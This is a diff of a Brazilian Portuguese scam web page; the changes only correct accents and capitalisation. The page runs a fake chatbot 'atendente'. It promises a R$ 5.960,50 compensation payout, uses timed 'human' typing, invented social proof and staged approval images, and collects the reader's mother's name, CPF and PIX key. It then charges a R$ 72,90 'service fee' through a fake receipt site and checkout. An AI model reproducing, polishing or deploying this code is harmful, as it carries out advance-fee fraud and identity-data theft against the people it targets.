@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="pt"><head>
+<!DOCTYPE html><html lang="pt-BR"><head>
 <script>
   window.pixelId = "69a64ea97bd1ecfa7e6be10c";
   var a = document.createElement("script");
@@ -367,7 +367,7 @@
     const VALOR_INDENIZACAO = "R$ 5.960,50";
     const VALOR_TAXA = "R$ 72,90";
 
-    // Configuracao central de ritmo "humano" do atendimento.
+    // Configuração central de ritmo "humano" do atendimento.
     // Ajuste apenas este objeto para acelerar/desacelerar todo o fluxo.
     const CHAT_TIMING = {
       typingBaseMs: 520,
@@ -402,8 +402,8 @@
       "NENHUMA DAS ALTERNATIVAS"
     ];
 
-    const estadosCivis = ["Casado (a)", "Solteiro (a)", "Viuvo (a)", "Divorciado (a)"];
-    const tiposPix = ["CPF", "Numero de Telefone", "E-mail", "Chave Aleatoria"];
+    const estadosCivis = ["Casado(a)", "Solteiro(a)", "Viúvo(a)", "Divorciado(a)"];
+    const tiposPix = ["CPF", "Número de Telefone", "E-mail", "Chave Aleatória"];
 
     const params = new URLSearchParams(window.location.search);
     const chatLog = document.getElementById("chatLog");
@@ -440,7 +440,7 @@
 
       const cpf = (params.get("cpf") || parsed.cpf || "").replace(/\D/g, "");
       const nome = params.get("nome") || parsed.nome || "Cliente";
-      const mae = parsed.mae || "MAE NAO INFORMADA";
+      const mae = parsed.mae || "MÃE NÃO INFORMADA";
 
       return { cpf, nome, mae };
     }
@@ -640,16 +640,16 @@
 
     async function startFlow() {
       appendPhaseChip("Atendente online");
-      await botSay("Seja bem-vindo(a)! Nos proximos passos vou te auxiliar a concluir sua solicitacao.");
-      await botSay("Primeiro clique no video abaixo que eu vou te auxiliar agora mesmo.", { afterMs: CHAT_TIMING.custom.introVideoLeadMs });
+      await botSay("Seja bem-vindo(a)! Nos próximos passos vou te auxiliar a concluir sua solicitação.");
+      await botSay("Primeiro clique no vídeo abaixo que eu vou te auxiliar agora mesmo.", { afterMs: CHAT_TIMING.custom.introVideoLeadMs });
       await appendMedia("iframe", "https://scripts.converteai.net/01ab5580-7fc5-4470-87ab-5aace1f2fba2/players/69517bb0b6c0dcc4672832d4/v4/embed.html", { afterMs: CHAT_TIMING.custom.afterIntroVideoMs });
-      await botSay("Nos ultimos dias, milhares de pessoas concluiram esta etapa com sucesso.");
-      await botSay(`Responda as perguntas a seguir para aprovacao do seu recebimento de <b>${VALOR_INDENIZACAO}</b>.`);
+      await botSay("Nos últimos dias, milhares de pessoas concluíram esta etapa com sucesso.");
+      await botSay(`Responda às perguntas a seguir para aprovação do seu recebimento de <b>${VALOR_INDENIZACAO}</b>.`);
       await askMotherName();
     }
 
     async function askMotherName() {
-      await botSay("Por favor, confirme o nome de sua mae.");
+      await botSay("Por favor, confirme o nome de sua mãe.");
       const correta = normalizeUpper(state.mae);
       const options = [correta, ...perguntasMae];
       appendOptions(options, "green", async (selected) => {
@@ -660,8 +660,8 @@
     }
 
     async function askEmpresaNoCelular() {
-      await botSay("Voce ja instalou ou acessou o app da empresa no seu celular?");
-      appendOptions(["Sim", "Nao"], "green", async (selected) => {
+      await botSay("Você já instalou ou acessou o app da empresa no seu celular?");
+      appendOptions(["Sim", "Não"], "green", async (selected) => {
         state.empresaNoCelular = selected;
         appendUserText(selected);
         await wait(CHAT_TIMING.afterUserReplyMs);
@@ -680,14 +680,14 @@
     }
 
     async function etapaMidiaValidacao() {
-      appendPhaseChip("Validacao de dados");
+      appendPhaseChip("Validação de dados");
       await appendMedia("image", "https://minio-production-7432.up.railway.app/typebot/public/workspaces/cmat4b52b0000s02m2dyacqqu/typebots/jaz0he6dma4dek1g2zpaos57/blocks/k46iqhq3e2przpg382pv58n3?v=1762671533129", { afterMs: CHAT_TIMING.custom.betweenValidationImagesMs });
       await appendMedia("image", "https://minio-production-7432.up.railway.app/typebot/public/workspaces/cmat4b52b0000s02m2dyacqqu/typebots/jaz0he6dma4dek1g2zpaos57/blocks/e9088km6u3gf5gc1vvebw61p?v=1762671540890");
       await appendMedia("audio", "https://audio.jukehost.co.uk/auvm5pKUeDEVRwohC5zUlUKXpgAZLV9Y", { afterMs: CHAT_TIMING.custom.afterValidationAudioMs });
-      await botSay("Solicitando aprovacao da sua solicitacao. Aguarde alguns segundos...", { afterMs: CHAT_TIMING.custom.afterSolicitandoAprovacaoMs });
+      await botSay("Solicitando aprovação da sua solicitação. Aguarde alguns segundos...", { afterMs: CHAT_TIMING.custom.afterSolicitandoAprovacaoMs });
       await appendMedia("image", "https://minio-production-7432.up.railway.app/typebot/public/workspaces/cmat4b52b0000s02m2dyacqqu/typebots/jaz0he6dma4dek1g2zpaos57/blocks/ubu969a80hmx3l3itlz3rlas?v=1762671551243");
-      await botSay("Prossiga inserindo sua chave Pix para concluir seu recebimento gerando seu comprovante.");
-      await botSay("Selecione a chave Pix que deseja usar:");
+      await botSay("Prossiga inserindo sua chave PIX para concluir seu recebimento gerando seu comprovante.");
+      await botSay("Selecione a chave PIX que deseja usar:");
       askPixType();
     }
 
@@ -704,12 +704,12 @@
         }
 
         const placeholders = {
-          "Numero de Telefone": "Digite o numero de telefone com DDD",
-          "E-mail": "Digite seu e-mail Pix",
-          "Chave Aleatoria": "Digite sua chave aleatoria Pix"
+          "Número de Telefone": "Digite o número de telefone com DDD",
+          "E-mail": "Digite seu e-mail PIX",
+          "Chave Aleatória": "Digite sua chave aleatória PIX"
         };
 
-        askInlineInput(placeholders[selected] || "Digite sua chave Pix", async (value) => {
+        askInlineInput(placeholders[selected] || "Digite sua chave PIX", async (value) => {
           state.pixValor = value;
           appendUserText(value);
           await wait(CHAT_TIMING.afterUserReplyMs);
@@ -719,8 +719,8 @@
     }
 
     async function confirmarPix() {
-      await botSay(`<b>ATENCAO:</b> Verifique se a chave Pix informada esta correta.<br><br><b>${state.pixValor}</b><br><br>A empresa nao se responsabiliza por chave Pix informada incorretamente.`);
-      appendOptions(["Sim, esta correto."], "blue", async (selected) => {
+      await botSay(`<b>ATENÇÃO:</b> Verifique se a chave PIX informada está correta.<br><br><b>${state.pixValor}</b><br><br>A empresa não se responsabiliza por chave PIX informada incorretamente.`);
+      appendOptions(["Sim, está correto."], "blue", async (selected) => {
         appendUserText(selected);
         await wait(CHAT_TIMING.afterUserReplyMs);
         await etapaComprovante();
@@ -729,11 +729,11 @@
 
     async function etapaComprovante() {
       appendPhaseChip("Cadastro da chave Pix");
-      await botSay("Aguarde alguns segundos, estamos cadastrando sua chave Pix no sistema...", { afterMs: CHAT_TIMING.custom.afterCadastroPixMsgMs });
+      await botSay("Aguarde alguns segundos, estamos cadastrando sua chave PIX no sistema...", { afterMs: CHAT_TIMING.custom.afterCadastroPixMsgMs });
       await appendMedia("image", "https://minio-production-7432.up.railway.app/typebot/public/workspaces/cmat4b52b0000s02m2dyacqqu/typebots/jaz0he6dma4dek1g2zpaos57/blocks/lygixgb9pg6rp1po2f5zsmes?v=1762671562176");
-      await botSay("Sua chave Pix foi cadastrada com sucesso!");
+      await botSay("Sua chave PIX foi cadastrada com sucesso!");
       await appendMedia("audio", "https://minio-production-8829.up.railway.app/typebot/public/workspaces/cma37nmaa0000cqjr0wbg8bpb/typebots/vnmk2k1demf9awax9ubw4ph3/blocks/ufkn04e8qgib70q129ucz7h8?v=1746964362275", { afterMs: CHAT_TIMING.custom.afterCadastroPixAudioMs });
-      await botSay(`Clique no botao abaixo para confirmar e liberar o envio para a chave Pix informada.<br><br>Geraremos seu comprovante de <b>${VALOR_INDENIZACAO}</b> neste instante.`);
+      await botSay(`Clique no botão abaixo para confirmar e liberar o envio para a chave PIX informada.<br><br>Geraremos seu comprovante de <b>${VALOR_INDENIZACAO}</b> neste instante.`);
       appendOptions(["Confirmar e gerar comprovante de recebimento"], "blue", async (selected) => {
         appendUserText(selected);
         await wait(CHAT_TIMING.afterUserReplyMs);
@@ -748,13 +748,13 @@
       const urlComprovante = `https://comprovantte.sbs/?nome=${encodeURIComponent(state.nome)}&cpf=${encodeURIComponent(state.cpf)}&valor=${encodeURIComponent(VALOR_TAXA)}`;
       await appendMedia("iframe", urlComprovante);
       await appendMedia("audio", "https://minio-production-7432.up.railway.app/typebot/public/workspaces/cmat4b52b0000s02m2dyacqqu/typebots/jaz0he6dma4dek1g2zpaos57/blocks/vmjypazr1e9svjag8lgqf4w3?v=1762671901465");
-      await botSay(`<b>Resumo da solicitacao</b><br><br>Valor para saque: <b>${VALOR_INDENIZACAO}</b><br>Titular: <b>${state.nome}</b><br>Chave Pix: <b>${state.pixValor}</b><br>Taxa de servico: <b>${VALOR_TAXA}</b>`);
+      await botSay(`<b>Resumo da solicitação</b><br><br>Valor para saque: <b>${VALOR_INDENIZACAO}</b><br>Titular: <b>${state.nome}</b><br>Chave PIX: <b>${state.pixValor}</b><br>Taxa de serviço: <b>${VALOR_TAXA}</b>`);
       appendOptions(["Por que tenho que pagar essa taxa?"], "blue", async (selected) => {
         appendUserText(selected);
         await wait(CHAT_TIMING.afterUserReplyMs);
-        await botSay("A taxa de servico cobre validacao operacional, emissao de comprovante e processamento da transferencia em ambiente protegido.");
-        await botSay("Apos a confirmacao da taxa, a solicitacao segue para conclusao.");
-        appendOptions(["Concluir pagamento e receber minha indenizacao"], "blue", () => {
+        await botSay("A taxa de serviço cobre validação operacional, emissão de comprovante e processamento da transferência em ambiente protegido.");
+        await botSay("Após a confirmação da taxa, a solicitação segue para conclusão.");
+        appendOptions(["Concluir pagamento e receber minha indenização"], "blue", () => {
           if (typeof fbTrack === "function") {
             fbTrack("InitiateCheckout", {
               content_name: "Chat -> Checkout",
